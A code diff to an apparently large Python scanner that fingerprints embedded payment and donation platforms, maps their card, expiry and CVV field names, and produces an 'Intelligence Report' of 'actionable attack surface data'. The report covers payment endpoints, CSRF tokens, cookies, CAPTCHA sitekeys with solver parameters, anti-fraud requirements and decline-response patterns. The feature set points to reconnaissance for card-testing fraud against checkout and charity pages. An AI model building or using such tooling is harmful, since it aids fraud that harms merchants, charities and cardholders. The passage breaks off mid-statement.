@@ -25395,6 +25395,256 @@ def _build_flat_post_body(
     return post_body, field_map
 
 
+# ══════════════════════════════════════════════════════════════
+# ── Embedded Payment Platform Detector  (ENH) ─────────────────
+# ══════════════════════════════════════════════════════════════
+
+# Known embedded donation / payment platforms and their iframe / script fingerprints.
+# Each entry: (provider_name, [url_patterns], [synthetic_card_fields], tokenized?)
+_EMBED_PAYMENT_PLATFORMS = [
+    (
+        "DonorBox",
+        [r'donorbox\.org'],
+        ["first_name","last_name","email","amount","card_number","exp_month","exp_year","cvv"],
+        True,
+    ),
+    (
+        "Stripe Elements",
+        [r'js\.stripe\.com/v3', r'stripe\.com/v3'],
+        ["cardnumber","exp-date","cvc","postal"],
+        True,
+    ),
+    (
+        "PayPal Hosted",
+        [r'paypal\.com/sdk', r'paypalobjects\.com', r'paypal\.com/donate'],
+        ["amount","currency","payer_email"],
+        True,
+    ),
+    (
+        "Braintree Drop-in",
+        [r'braintreegateway\.com', r'paypal\.com/web/static/analytics'],
+        ["number","expirationDate","cvv","postalCode"],
+        True,
+    ),
+    (
+        "Network For Good",
+        [r'networkforgood\.com'],
+        ["firstName","lastName","email","amount","cardNumber","expirationMonth","expirationYear","cvv2"],
+        True,
+    ),
+    (
+        "Classy",
+        [r'classy\.org'],
+        ["first_name","last_name","email_address","amount","card_number","card_expiry","card_cvv"],
+        True,
+    ),
+    (
+        "Givingfuel",
+        [r'givingfuel\.com'],
+        ["FirstName","LastName","Email","Amount","CardNumber","ExpMonth","ExpYear","CVV"],
+        True,
+    ),
+    (
+        "Bloomerang",
+        [r'bloomerang\.co'],
+        ["first_name","last_name","email","amount","card_number","expiry","cvv"],
+        True,
+    ),
+    (
+        "Mightycause",
+        [r'mightycause\.com'],
+        ["first_name","last_name","email","amount","card_number","exp","cvv"],
+        True,
+    ),
+    (
+        "Fundly",
+        [r'fundly\.com'],
+        ["first_name","last_name","email","amount","card_number","exp_month","exp_year","cvv"],
+        True,
+    ),
+    (
+        "Blackbaud / BBIS",
+        [r'blackbaud\.com', r'bbis\.com', r'luminate\.com'],
+        ["BBAFD_FNAME","BBAFD_LNAME","BBAFD_EMAIL","AMOUNT","CARD_NUMBER","EXPIRY","CVV"],
+        True,
+    ),
+    (
+        "Qgiv",
+        [r'qgiv\.com'],
+        ["firstName","lastName","email","amount","cardNumber","expirationDate","cvv"],
+        True,
+    ),
+    (
+        "Stripe Checkout (redirect)",
+        [r'checkout\.stripe\.com'],
+        ["email","card","cardNumber","cardExpiry","cardCvc"],
+        True,
+    ),
+    (
+        "Square",
+        [r'squareup\.com', r'squarecdn\.com', r'connect\.squareup\.com'],
+        ["cardNumber","expirationDate","cvv","postalCode"],
+        True,
+    ),
+    (
+        "Adyen",
+        [r'adyen\.com', r'checkoutshopper'],
+        ["encryptedCardNumber","encryptedExpiryMonth","encryptedExpiryYear","encryptedSecurityCode"],
+        True,
+    ),
+    (
+        "Authorize.Net Accept.js",
+        [r'accept\.authorize\.net', r'js\.authorize\.net'],
+        ["cardNumber","expDate","cardCode"],
+        True,
+    ),
+    (
+        "Razorpay",
+        [r'checkout\.razorpay\.com'],
+        ["email","contact","amount","card[number]","card[expiry]","card[cvv]","card[name]"],
+        True,
+    ),
+    (
+        "PayU",
+        [r'payu\.in', r'payu\.com'],
+        ["firstname","lastname","email","phone","amount","cardnum","ccvv","ccexpmon","ccexpyr"],
+        True,
+    ),
+    (
+        "2Checkout / Verifone",
+        [r'2checkout\.com', r'2co\.com'],
+        ["cc_number","cc_cvc","cc_expiry","name","email"],
+        True,
+    ),
+]
+
+# Card-field metadata mapping for synthetic fields
+_SYNTH_CARD_META = {
+    # field name pattern → (field_label, card_type, icon)
+    r'card.?number|cardnum|cc.?num|encryptedcard': ("Card Number",       "Card Number",   "💳"),
+    r'exp.?month|cc.?exp.?m|expiry.?m':            ("Expiry Month",      None,            "📅"),
+    r'exp.?year|cc.?exp.?y|expiry.?y':             ("Expiry Year",       None,            "📅"),
+    r'exp.?date|expirat|ccexpiry|card.?expir':      ("Expiry MM/YY",     None,            "📅"),
+    r'cvv|cvc|csc|cvn|cc.?code|security.?code|encryptedsecur': ("CVV/CVC", "CVV/CVC", "🔒"),
+    r'postal|zip':                                  ("Postal / ZIP",      None,            "📮"),
+    r'first.?name|fname':                           ("First Name",        None,            "👤"),
+    r'last.?name|lname|surname':                    ("Last Name",         None,            "👤"),
+    r'email':                                       ("Email",             None,            "✉️"),
+    r'phone|contact|mobile':                        ("Phone",             None,            "📱"),
+    r'amount|donation|price':                       ("Amount",            None,            "💰"),
+    r'currency':                                    ("Currency",          None,            "💱"),
+    r'name':                                        ("Cardholder Name",   None,            "👤"),
+}
+
+def _synth_field_meta(name: str):
+    """Return (field_label, card_type, icon) for a synthetic field name."""
+    nl = name.lower()
+    for pat, (label, card_type, icon) in _SYNTH_CARD_META.items():
+        if re.search(pat, nl):
+            return label, card_type, icon
+    return name.replace("_", " ").title(), None, "✏️"
+
+
+def _detect_embedded_payment_platforms(html: str, js_text: str = "") -> list:
+    """
+    ENH: Detect known third-party donation/payment embed platforms from
+    iframe src, script src, and inline JS globals.
+
+    Returns list of dicts:
+      {
+        'provider':      str,
+        'iframe_src':    str | None,   # first matched iframe/script URL
+        'tokenized':     bool,
+        'synthetic_fields': [field_dict, ...],
+        'source':        'iframe_embed' | 'script_embed',
+      }
+    """
+    combined = html + js_text
+    detected = []
+    seen_providers: set = set()
+
+    # Extract all iframe src and script src URLs from HTML
+    iframe_srcs = re.findall(
+        r'<iframe[^>]+src=["\']([^"\']+)["\']',
+        html, re.I
+    )
+    script_srcs = re.findall(
+        r'<script[^>]+src=["\']([^"\']+)["\']',
+        html, re.I
+    )
+    all_urls = iframe_srcs + script_srcs
+
+    for provider, patterns, synth_field_names, tokenized in _EMBED_PAYMENT_PLATFORMS:
+        if provider in seen_providers:
+            continue
+
+        matched_src   = None
+        matched_source = 'script_embed'
+
+        # Check against collected URLs first
+        for url_candidate in all_urls:
+            for pat in patterns:
+                if re.search(pat, url_candidate, re.I):
+                    matched_src = url_candidate
+                    matched_source = (
+                        'iframe_embed' if url_candidate in iframe_srcs
+                        else 'script_embed'
+                    )
+                    break
+            if matched_src:
+                break
+
+        # Fallback: check combined HTML+JS text (catches dynamically injected iframes)
+        if not matched_src:
+            for pat in patterns:
+                m = re.search(pat, combined, re.I)
+                if m:
+                    # Try to capture surrounding URL
+                    _ctx = combined[max(0, m.start()-120):m.end()+120]
+                    _url_m = re.search(r'https?://[^\s\'"<>]+', _ctx)
+                    matched_src    = _url_m.group(0).strip('.,)') if _url_m else f"[{provider}]"
+                    matched_source = 'script_embed'
+                    break
+
+        if not matched_src:
+            continue
+
+        seen_providers.add(provider)
+
+        # Build synthetic fields
+        synthetic_fields = []
+        for fname in synth_field_names:
+            flabel, fcard_type, ficon = _synth_field_meta(fname)
+            synthetic_fields.append({
+                'name':         fname,
+                'type':         'text',
+                'value':        '',
+                'required':     True,
+                'field_label':  flabel,
+                'icon':         ficon,
+                'is_dynamic':   True,
+                'is_card':      fcard_type is not None,
+                'card_type':    fcard_type,
+                'placeholder':  '',
+                'from_iframe':  matched_source == 'iframe_embed',
+                'source':       matched_source,
+                'note':         (
+                    f'Hosted by {provider} — fields rendered in cross-origin iframe, '
+                    f'direct DOM access blocked by browser same-origin policy'
+                ),
+            })
+
+        detected.append({
+            'provider':         provider,
+            'iframe_src':       matched_src,
+            'tokenized':        tokenized,
+            'synthetic_fields': synthetic_fields,
+            'source':           matched_source,
+        })
+
+    return detected
+
+
 def _detect_payment_gateway(html: str, js_sources: str = '') -> list:
     """HTML + JS မှ payment gateway detect လုပ်သည်။"""
     combined   = html + js_sources
@@ -25883,12 +26133,21 @@ def _extract_requests_playwright(url: str, progress_cb=None) -> list:
                             const doc = fr.contentDocument || fr.contentWindow.document;
                             if (doc) extractFrom(doc, 'iframe_' + i);
                         } catch(e) {
+                            const src   = fr.src || fr.getAttribute('src') || '';
+                            const title = fr.title || fr.getAttribute('title') || '';
+                            const fname = fr.name  || fr.getAttribute('name')  || '';
+                            const w     = fr.width  || fr.style.width  || '';
+                            const h     = fr.height || fr.style.height || '';
                             fields.push({
-                                name: 'iframe_' + i, type: 'iframe',
-                                value: fr.src || '', placeholder: '',
-                                required: false,
-                                label: 'Hosted payment iframe: ' + (fr.src||'cross-origin'),
-                                options: [], from_iframe: true,
+                                name:        'iframe_' + i,
+                                type:        'iframe',
+                                value:       src,
+                                placeholder: '',
+                                required:    false,
+                                label:       'Cross-origin payment iframe: ' + (src || 'unknown'),
+                                options:     [],
+                                from_iframe: true,
+                                iframe_meta: {src: src, title: title, name: fname, width: w, height: h},
                             });
                         }
                     });
@@ -30328,6 +30587,40 @@ def _payload_sync(url: str, progress_cb=None) -> dict:
     static_forms = _extract_forms_static(static_html, url) if static_html else []
     for _sf in static_forms:
         _sf.setdefault('source', 'static_html')
+
+    # ── ENH: Detect embedded payment/donation platform iframes (e.g. DonorBox,
+    # Stripe Elements, PayPal, Network For Good, Classy, Givingfuel …)
+    # These render in cross-origin iframes so <form> tags never appear in static HTML.
+    _embed_platforms = _detect_embedded_payment_platforms(static_html)
+    _embed_providers_found: set = set()
+    for _ep in _embed_platforms:
+        _prov = _ep['provider']
+        if _prov in _embed_providers_found:
+            continue
+        _embed_providers_found.add(_prov)
+        _synth_card_fields = [f for f in _ep['synthetic_fields'] if f.get('is_card')]
+        static_forms.append({
+            'source':         _ep['source'],
+            'form_idx':       len(static_forms) + 1,
+            'endpoint':       _ep['iframe_src'],
+            'method':         'POST',
+            'enctype':        'cross-origin-iframe',
+            'fields':         _ep['synthetic_fields'],
+            'card_fields':    _synth_card_fields,
+            'is_payment':     True,
+            'provider':       _prov,
+            'tokenized':      _ep['tokenized'],
+            'note': (
+                f'{_prov} hosted form — cross-origin iframe, '
+                f'raw card data never touches your server (tokenized)'
+            ),
+        })
+        if progress_cb:
+            progress_cb(
+                f"🖼️  Embedded platform: {_prov} "
+                f"({len(_ep['synthetic_fields'])} synthetic field(s))"
+            )
+
     if progress_cb: progress_cb(f"📋 {len(static_forms)} static form(s) — Playwright launching...")
 
     pw_requests = _extract_requests_playwright(url, progress_cb)
@@ -30335,11 +30628,41 @@ def _payload_sync(url: str, progress_cb=None) -> dict:
     js_html = fetch_with_playwright(url) or ''
     js_forms = []
     if js_html and js_html != static_html:
-        js_forms = _extract_forms_static(js_html, url)
-        existing = {(f['endpoint'], f['method']) for f in static_forms}
-        js_forms = [f for f in js_forms if (f['endpoint'], f['method']) not in existing]
+        # Re-run embed detection on JS-rendered HTML (catches lazily injected iframes)
+        _js_embed_platforms = _detect_embedded_payment_platforms(js_html)
+        for _jep in _js_embed_platforms:
+            _prov = _jep['provider']
+            if _prov in _embed_providers_found:
+                continue
+            _embed_providers_found.add(_prov)
+            _synth_card_fields = [f for f in _jep['synthetic_fields'] if f.get('is_card')]
+            js_forms.append({
+                'source':      _jep['source'] + '_js',
+                'form_idx':    len(static_forms) + len(js_forms) + 1,
+                'endpoint':    _jep['iframe_src'],
+                'method':      'POST',
+                'enctype':     'cross-origin-iframe',
+                'fields':      _jep['synthetic_fields'],
+                'card_fields': _synth_card_fields,
+                'is_payment':  True,
+                'provider':    _prov,
+                'tokenized':   _jep['tokenized'],
+                'note': (
+                    f'{_prov} hosted form (JS-rendered) — '
+                    f'cross-origin iframe, tokenized'
+                ),
+            })
+            if progress_cb:
+                progress_cb(f"🖼️  JS-rendered embed: {_prov}")
+
+        _existing_js = {(f['endpoint'], f['method']) for f in static_forms + js_forms}
+        _js_static = _extract_forms_static(js_html, url)
+        js_forms += [f for f in _js_static if (f['endpoint'], f['method']) not in _existing_js]
         for f in js_forms:
-            f['source'] = 'js_render'
+            # Don't overwrite source for embed platform forms already tagged
+            if not f.get('source', '').endswith('_embed') and \
+               not f.get('source', '').endswith('_embed_js'):
+                f['source'] = 'js_render'
 
     # ── Split pw_requests: js_text | DOM forms | network requests | storage ─
     js_text       = ''
@@ -30657,6 +30980,33 @@ def _payload_sync(url: str, progress_cb=None) -> dict:
                     if _is_login and not re.search(r'card|payment|checkout', _html, re.I):
                         return None
                     _sub_forms = _extract_forms_static(_html, _sr.url)
+                    # ENH: detect embedded platforms in subpages too
+                    _sub_embeds = _detect_embedded_payment_platforms(_html)
+                    _sub_seen_prov: set = {
+                        f.get('provider', '') for f in _sub_forms
+                    }
+                    for _se in _sub_embeds:
+                        _prov = _se['provider']
+                        if _prov in _sub_seen_prov:
+                            continue
+                        _sub_seen_prov.add(_prov)
+                        _sc_fields = [f for f in _se['synthetic_fields'] if f.get('is_card')]
+                        _sub_forms.append({
+                            'source':      _se['source'],
+                            'form_idx':    len(_sub_forms) + 1,
+                            'endpoint':    _se['iframe_src'],
+                            'method':      'POST',
+                            'enctype':     'cross-origin-iframe',
+                            'fields':      _se['synthetic_fields'],
+                            'card_fields': _sc_fields,
+                            'is_payment':  True,
+                            'provider':    _prov,
+                            'tokenized':   _se['tokenized'],
+                            'note': (
+                                f'{_prov} hosted form on sub-page — '
+                                f'cross-origin iframe, tokenized'
+                            ),
+                        })
                     _sk        = _extract_recaptcha_info(_html, '', _sr.url)
                     _spa       = _is_spa_html(_html)
                     # Use the resolved URL (after redirect) as the path
@@ -30741,13 +31091,36 @@ def _payload_sync(url: str, progress_cb=None) -> dict:
                     continue
 
                 _pw_forms = _extract_forms_static(_pw_html, _sub_url)
+                # ENH: embed detection on Playwright-rendered SPA HTML
+                _pw_embeds = _detect_embedded_payment_platforms(_pw_html)
+                _pw_embed_seen = {f.get('provider', '') for f in _pw_forms}
+                for _pwe in _pw_embeds:
+                    _pprov = _pwe['provider']
+                    if _pprov in _pw_embed_seen or _pprov in _embed_providers_found:
+                        continue
+                    _pw_embed_seen.add(_pprov)
+                    _embed_providers_found.add(_pprov)
+                    _pwe_card = [f for f in _pwe['synthetic_fields'] if f.get('is_card')]
+                    _pw_forms.append({
+                        'source':      f'subpage_js_embed:{_sp}',
+                        'endpoint':    _pwe['iframe_src'],
+                        'method':      'POST',
+                        'enctype':     'cross-origin-iframe',
+                        'fields':      _pwe['synthetic_fields'],
+                        'card_fields': _pwe_card,
+                        'is_payment':  True,
+                        'provider':    _pprov,
+                        'tokenized':   _pwe['tokenized'],
+                        'note':        f'{_pprov} embed (SPA sub-page {_sp}) — tokenized',
+                    })
                 _pw_sk    = _extract_recaptcha_info(_pw_html, '', _sub_url)
 
                 _pw_added = 0
                 for _pwf in _pw_forms:
                     _ep = _pwf.get('endpoint', '')
-                    if _ep not in _existing_eps and _pwf.get('fields'):
-                        _pwf['source'] = f'subpage_js:{_sp}'
+                    if _ep not in _existing_eps and (_pwf.get('fields') or _pwf.get('enctype') == 'cross-origin-iframe'):
+                        if not _pwf.get('source', '').startswith('subpage_js_embed'):
+                            _pwf['source'] = f'subpage_js:{_sp}'
                         subpage_forms.append(_pwf)
                         _existing_eps.add(_ep)
                         _pw_added += 1
@@ -31600,6 +31973,69 @@ def _format_payload_report(data: dict) -> str:  # noqa: C901
         if _bt.get('iframe_src'):
             lines.append(f"  `{raw_code(_bt['iframe_src'], 80)}`")
 
+    # ── Embedded Payment Platform block ───────────────────────
+    if _embed_forms_ov:
+        # Deduplicate by provider name
+        _seen_ep: set = set()
+        _unique_embeds = []
+        for _ef in _embed_forms_ov:
+            _prov = _ef.get('provider', '')
+            if _prov not in _seen_ep:
+                _seen_ep.add(_prov)
+                _unique_embeds.append(_ef)
+
+        lines.append(_sec(
+            f"Embedded Payment Platform(s)  ·  {len(_unique_embeds)} detected",
+            "🖼️"
+        ))
+        for _ef in _unique_embeds:
+            _prov      = _ef.get('provider', 'Unknown')
+            _ep_src    = _ef.get('endpoint', '')
+            _tokenized = _ef.get('tokenized', True)
+            _src_type  = _ef.get('source', '')
+            _note      = _ef.get('note', '')
+            _ef_fields = _ef.get('fields', [])
+            _ef_cards  = [f for f in _ef_fields if f.get('is_card')]
+
+            _tok_badge = (
+                "✅ _tokenized — raw card never touches your server_"
+                if _tokenized
+                else "⚠️ _tokenization unknown_"
+            )
+            _src_badge = (
+                "_(iframe)_" if 'iframe' in _src_type else "_(script inject)_"
+            )
+
+            lines.append(f"  🏷️ *{escape_md(_prov)}*  {_src_badge}")
+            lines.append(f"  {_tok_badge}")
+            if _ep_src and len(_ep_src) < 100:
+                lines.append(f"  `{raw_code(_ep_src, 90)}`")
+
+            # Show synthetic field breakdown
+            if _ef_cards:
+                _card_names = "  ".join(
+                    f"`{raw_code(f['name'], 24)}`"
+                    + (f" _{escape_md(f.get('card_type',''))}_"
+                       if f.get('card_type') else "")
+                    for f in _ef_cards[:6]
+                )
+                lines.append(f"  💳 Card fields: {_card_names}")
+
+            _non_card = [
+                f for f in _ef_fields
+                if not f.get('is_card')
+                and f.get('type') not in ('submit', 'button', 'reset', 'iframe')
+            ]
+            if _non_card:
+                _nc_names = "  ".join(
+                    f"`{raw_code(f['name'], 22)}`" for f in _non_card[:5]
+                )
+                lines.append(f"  📝 Other fields: {_nc_names}")
+
+            lines.append(
+                f"  _DOM scraping blocked — use provider SDK/API for tokenization_"
+            )
+
     # ── CAPTCHA / Sitekey block — full detail ────────────────
     _all_sitekeys = []
     if rc and rc.get('all_keys'):
@@ -31625,6 +32061,14 @@ def _format_payload_report(data: dict) -> str:  # noqa: C901
     total_forms   = len(ordered)
     total_xhr     = len(requests_)
 
+    # Pre-compute embed forms list so overview and embed section share same data
+    _embed_forms_ov = [
+        f for f in ordered
+        if f.get('enctype') == 'cross-origin-iframe'
+        and f.get('provider')
+        and f.get('source') != 'braintree_hosted'
+    ]
+
     # UI/UX refactor: icon-prefixed rows replace fixed-width backtick column table
     lines.append("*── Overview ──────────────────*")
     lines.append(f"💳 Gateway   `{raw_code(gw_label, 28)}`")
@@ -31647,7 +32091,8 @@ def _format_payload_report(data: dict) -> str:  # noqa: C901
                            if tf['value'] else '')
                     )
     lines.append(f"📋 Forms     `{total_forms}`" +
-                 (f"  _({pay_cnt} payment)_" if pay_cnt else ""))
+                 (f"  _({pay_cnt} payment)_" if pay_cnt else "") +
+                 (f"  🖼️ _({len(_embed_forms_ov)} embedded)_" if _embed_forms_ov else ""))
     lines.append(f"📡 XHR       `{total_xhr}` intercepted")
     lines.append(f"⚠️  Risk      {risk_badge}  _{escape_md(risk_note)}_")
     if _dfps_ov := data.get('device_fingerprints', []):
@@ -31779,6 +32224,9 @@ def _format_payload_report(data: dict) -> str:  # noqa: C901
         src_note  = ""
         if len(sources) > 1:
             src_note = f" _{escape_md('×' + str(len(sources)) + ' sources')}_"
+        elif src_lbl.startswith('subpage_js_embed:') or src_lbl in ('iframe_embed', 'script_embed', 'iframe_embed_js', 'script_embed_js'):
+            _prov_n = entry.get('provider', 'Embed')
+            src_note = f" 🖼️ _{escape_md(_prov_n)}_"
         elif src_lbl.startswith('subpage:'):
             src_note = f" _sub\\-page `{escape_md(src_lbl[8:])}`_"
         elif src_lbl == 'playwright_dom':
@@ -31795,18 +32243,48 @@ def _format_payload_report(data: dict) -> str:  # noqa: C901
         if ct_short:
             lines.append(f"  _{escape_md(ct_short)}_")
 
-        # No fields case
+        # No fields case — but cross-origin-iframe embeds get special rendering
         if not fields:
-            rb   = entry.get('raw_body', '')
-            note = entry.get('note', '')
-            lines.append(f"  📝 `{raw_code(rb[:100])}`" if rb else "  ⚠️ No extractable fields")
-            if note:
-                lines.append(f"  _ℹ️ {escape_md(note[:100])}_")
+            rb     = entry.get('raw_body', '')
+            note   = entry.get('note', '')
+            prov   = entry.get('provider', '')
+            is_tok = entry.get('tokenized', False)
+            if ct == 'cross-origin-iframe' and prov:
+                lines.append(f"🖼️ *{escape_md(prov)}* — Hosted payment iframe")
+                lines.append(f"  🔒 _Tokenized — raw card data never reaches your server_")
+                if ep:
+                    lines.append(f"  `{raw_code(ep[:80])}`")
+                if note:
+                    lines.append(f"  _ℹ️ {escape_md(note[:120])}_")
+                lines.append(
+                    f"  💡 _Use {escape_md(prov)} SDK/dashboard to inspect actual POST — "
+                    f"fields rendered in cross-origin iframe_"
+                )
+            else:
+                lines.append(f"  📝 `{raw_code(rb[:100])}`" if rb else "  ⚠️ No extractable fields")
+                if note:
+                    lines.append(f"  _ℹ️ {escape_md(note[:100])}_")
             continue
 
         card, pay, user, dyn, hidden, iframe = _classify(fields)
 
         lines.append("")
+
+        # ── Embed platform banner (cross-origin iframe with synthetic fields) ──
+        _is_embed = ct == 'cross-origin-iframe' or entry.get('source', '').endswith('_embed') \
+                    or entry.get('source', '').endswith('_embed_js') \
+                    or 'subpage_js_embed' in entry.get('source', '')
+        if _is_embed:
+            _prov_b = entry.get('provider', 'Hosted Platform')
+            _tok_b  = entry.get('tokenized', True)
+            lines.append(
+                f"🖼️ *{escape_md(_prov_b)}* — Hosted iframe embed"
+                + (" 🔒 _tokenized_" if _tok_b else "")
+            )
+            lines.append(
+                f"  _Fields rendered in cross-origin iframe · "
+                f"synthetic field names shown for reference_"
+            )
 
         # Iframe hosted fields
         if iframe:
@@ -33332,7 +33810,1045 @@ def _build_json_export(data: dict) -> str:
     if _gc_exp:
         out['gw_completeness'] = _gc_exp
 
+    # ── ENH8: embedded_platforms ─────────────────────────────
+    # Collect all embed-sourced forms from forms list and build
+    # a clean top-level section in the JSON export
+    _embed_exp_forms = [
+        f for f in (data.get('forms', []) + data.get('requests', []))
+        if f.get('enctype') == 'cross-origin-iframe' and f.get('provider')
+    ]
+    if _embed_exp_forms:
+        _seen_ep_prov: set = set()
+        _embed_exp_out = []
+        for _epf in _embed_exp_forms:
+            _prov = _epf.get('provider', '')
+            if _prov in _seen_ep_prov:
+                continue
+            _seen_ep_prov.add(_prov)
+            _ep_fields = _epf.get('fields', [])
+            _ep_cards  = [
+                {'name': f['name'], 'card_type': f.get('card_type', ''),
+                 'field_label': f.get('field_label', '')}
+                for f in _ep_fields if f.get('is_card')
+            ]
+            _ep_other  = [
+                {'name': f['name'], 'field_label': f.get('field_label', '')}
+                for f in _ep_fields
+                if not f.get('is_card')
+                and f.get('type') not in ('submit', 'button', 'reset', 'iframe')
+            ]
+            _embed_exp_out.append({
+                'provider':      _prov,
+                'tokenized':     _epf.get('tokenized', True),
+                'source':        _epf.get('source', ''),
+                'iframe_url':    _epf.get('endpoint', ''),
+                'note':          _epf.get('note', ''),
+                'card_fields':   _ep_cards,
+                'other_fields':  _ep_other,
+                'dom_accessible': False,
+                'reason': (
+                    'Cross-origin iframe — browser same-origin policy blocks '
+                    'DOM access. Use provider SDK or server-side API to interact.'
+                ),
+            })
+        if _embed_exp_out:
+            out['embedded_platforms'] = _embed_exp_out
+
     safe = _sanitize_for_json(out)
+    return json.dumps(safe, indent=2, ensure_ascii=False)
+
+
+# ══════════════════════════════════════════════════════════════
+# 🆕 JSON INTELLIGENCE REPORT
+# ══════════════════════════════════════════════════════════════
+
+def _build_intelligence_report(data: dict) -> str:
+    """
+    Build a focused, machine-readable Intelligence Report JSON file.
+
+    Unlike _build_json_export (full dump), this report is structured
+    around actionable attack surface data:
+
+    Sections:
+      target        — domain, risk, gateway, scanned_at
+      endpoints     — every discovered URL with method + content-type
+      parameters    — per-endpoint field map with semantic types
+      auth_surface  — tokens, cookies, CSRF mechanisms
+      captcha       — sitekeys + solver params
+      network       — XHR intercept, WS findings, live secrets
+      anti_fraud    — detected AF layers + required fields/headers
+      response_map  — success/decline patterns + ISO codes
+      sdk_profile   — payment SDKs + versions
+      risk_summary  — risk level, raw_post flag, 3DS, recommendations
+    """
+    from datetime import timezone
+
+    url     = data.get('url', '')
+    domain  = urlparse(url).hostname or url
+    now_utc = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
+
+    gateways   = data.get('gateways', [])
+    threeds    = data.get('threeds_signals', [])
+    live_finds = data.get('live_findings', [])
+    _raw_risk  = any(g.get('raw_post_risk') for g in gateways)
+
+    if _raw_risk or live_finds:
+        risk = 'HIGH'
+    elif gateways and threeds:
+        risk = 'MEDIUM'
+    elif gateways:
+        risk = 'MEDIUM'
+    else:
+        risk = 'LOW'
+
+    # ── [1] target ────────────────────────────────────────────
+    report: dict = {
+        'target': {
+            'url':        url,
+            'domain':     domain,
+            'scanned_at': now_utc,
+            'risk':       risk,
+            'raw_post':   _raw_risk,
+            'gateway':    gateways[0].get('name', '') if gateways else None,
+            'tokenization': gateways[0].get('tokenization', '') if gateways else None,
+        }
+    }
+    # strip None values
+    report['target'] = {k: v for k, v in report['target'].items() if v is not None and v != ''}
+
+    # ── [2] endpoints — all discovered URLs ──────────────────
+    all_entries = data.get('forms', []) + data.get('requests', [])
+    _ep_seen: set = set()
+    endpoints: list = []
+
+    for entry in all_entries:
+        ep  = entry.get('action') or entry.get('endpoint') or entry.get('url', '')
+        if not ep or ep in _ep_seen:
+            continue
+        _ep_seen.add(ep)
+        ep_obj: dict = {
+            'url':    ep,
+            'method': (entry.get('method') or 'POST').upper(),
+        }
+        ct = entry.get('enctype') or entry.get('content_type', '')
+        if ct:
+            ep_obj['content_type'] = ct
+        if entry.get('is_payment'):
+            ep_obj['payment_endpoint'] = True
+        if entry.get('source'):
+            ep_obj['source'] = entry['source']
+        endpoints.append(ep_obj)
+
+    # Add XHR endpoints from live_result
+    lr = data.get('live_result', {})
+    for req in (lr.get('requests') or [])[:30]:
+        ep = req.get('url', '')
+        if not ep or ep in _ep_seen:
+            continue
+        _ep_seen.add(ep)
+        endpoints.append({
+            'url':          ep,
+            'method':       req.get('method', 'POST').upper(),
+            'content_type': req.get('content_type', ''),
+            'source':       'xhr_intercept',
+        })
+
+    # GraphQL
+    gql = data.get('graphql_info')
+    if gql and gql.get('endpoint') and gql['endpoint'] not in _ep_seen:
+        endpoints.append({
+            'url':    gql['endpoint'],
+            'method': 'POST',
+            'source': 'graphql',
+        })
+
+    # API schema endpoints
+    schema = data.get('api_schema')
+    if schema:
+        for ep_obj in (schema.get('pay_endpoints') or [])[:10]:
+            ep = ep_obj.get('endpoint', '')
+            if ep and ep not in _ep_seen:
+                _ep_seen.add(ep)
+                endpoints.append({
+                    'url':     ep,
+                    'method':  ep_obj.get('method', 'POST'),
+                    'summary': ep_obj.get('summary', ''),
+                    'source':  'api_schema',
+                })
+
+    if endpoints:
+        report['endpoints'] = endpoints
+
+    # ── [3] parameters — field map per endpoint ───────────────
+    _CT_SEMANTIC: dict = {
+        'Card Number':        'card_number',
+        'CVV/CVC':            'cvv',
+        'Expiry Month':       'expiry_month',
+        'Expiry Year':        'expiry_year',
+        'Expiry MM/YY':       'expiry_mmyy',
+        'Cardholder Name':    'cardholder_name',
+        'Routing Number':     'routing_number',
+        'Account Number':     'account_number',
+        'CSRF Token':         'csrf_token',
+        'Nonce':              'nonce',
+        'Anti-Bot Token':     'antibot_token',
+        'OTP/Verification':   'otp',
+        'Amount':             'amount',
+        'Currency':           'currency',
+        'Billing First Name': 'billing_fname',
+        'Billing Last Name':  'billing_lname',
+        'Billing Address':    'billing_address',
+        'Billing City':       'billing_city',
+        'Billing State':      'billing_state',
+        'Billing Zip':        'billing_zip',
+        'Billing Country':    'billing_country',
+        'Order/Txn ID':       'order_id',
+        'Customer ID':        'customer_id',
+    }
+
+    def _sem(f: dict) -> str:
+        ct  = f.get('card_type', '')
+        ft  = f.get('type', 'text')
+        nm  = f.get('name', '').lower()
+        if ct in _CT_SEMANTIC:         return _CT_SEMANTIC[ct]
+        if re.search(r'recaptcha',nm): return 'recaptcha_token'
+        if re.search(r'card.?token',nm): return 'gateway_token'
+        if re.search(r'isajax|xsubmit|ispostback',nm): return 'static_flag'
+        if ft == 'email':              return 'email'
+        if ft == 'tel':                return 'phone'
+        if ft == 'hidden':             return 'hidden_field'
+        return 'text_input'
+
+    params_by_ep: dict = {}
+    for entry in all_entries:
+        ep = entry.get('action') or entry.get('endpoint') or entry.get('url', '') or 'unknown'
+        for f in entry.get('fields', []):
+            nm = f.get('name', '')
+            ft = f.get('type', 'text')
+            if not nm or ft in ('submit', 'button', 'reset', 'image', 'iframe'):
+                continue
+            if ep not in params_by_ep:
+                params_by_ep[ep] = {}
+            if nm not in params_by_ep[ep]:
+                params_by_ep[ep][nm] = {
+                    'type':     _sem(f),
+                    'required': bool(f.get('required', False)),
+                }
+                if f.get('is_dynamic'):
+                    params_by_ep[ep][nm]['dynamic'] = True
+                if f.get('is_honeypot'):
+                    params_by_ep[ep][nm]['honeypot'] = True
+                val = f.get('value', '')
+                if val and val not in ('', '0', '0.00'):
+                    params_by_ep[ep][nm]['static_value'] = val[:60]
+
+    if params_by_ep:
+        report['parameters'] = params_by_ep
+
+    # ── [4] auth_surface ──────────────────────────────────────
+    auth: dict = {}
+
+    # CSRF / nonce tokens
+    ts = data.get('token_sources', [])
+    rt = data.get('resolved_tokens', {})
+    if ts:
+        csrf_tokens = [
+            {
+                'name':        t.get('name', ''),
+                'source_type': t.get('source_type', ''),
+                'header_key':  rt.get(t.get('name',''), {}).get('header_key', '') or None,
+                'resolved':    rt.get(t.get('name',''), {}).get('value', '') or None,
+                'confidence':  rt.get(t.get('name',''), {}).get('confidence', '') or None,
+            }
+            for t in ts
+            if t.get('source_type') in ('hidden_input', 'meta_tag', 'js_variable', 'cookie')
+        ]
+        csrf_tokens = [{k: v for k, v in tok.items() if v} for tok in csrf_tokens]
+        if csrf_tokens:
+            auth['csrf_tokens'] = csrf_tokens
+
+    # Auth cookies
+    ck = data.get('auth_cookies', [])
+    if ck:
+        auth['cookies'] = [
+            {
+                'name':      c.get('name'),
+                'httponly':  c.get('httponly'),
+                'secure':    c.get('secure'),
+                'samesite':  c.get('samesite'),
+                'issues':    c.get('issues') or None,
+                'severity':  c.get('severity') or None,
+            }
+            for c in ck[:8]
+        ]
+        auth['cookies'] = [
